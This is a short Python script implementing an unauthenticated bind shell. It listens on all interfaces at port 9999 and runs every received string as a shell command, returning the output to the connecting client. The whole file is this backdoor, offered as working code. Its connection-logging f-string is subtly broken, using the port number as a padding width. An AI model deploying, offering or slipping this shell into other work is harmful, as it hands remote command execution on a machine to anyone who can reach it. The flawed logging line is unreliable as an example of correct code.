
import socket
import threading
import subprocess


def handle_client(client_socket):

    while True:
        
        cmd_buffer = client_socket.recv(1024).decode()
        if not cmd_buffer:
            break  
            
        try:
            output = subprocess.check_output(cmd_buffer,shell=True)

        except Exception as e:
            output = str(e).encode()
        
        client_socket.send(output)


def server_loop():
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind(("0.0.0.0",9999))
    server.listen(5)
    print("[*] Listening on 0.0.0.0:9999")


    while True:
        client_socket, addr = server.accept()
        print(f"[*] Connection from {addr[0]:{addr[1]}}")
        client_thread = threading.Thread(target=handle_client,args=(client_socket,))
        client_thread.start()


if __name__ == "__main__":
    server_loop()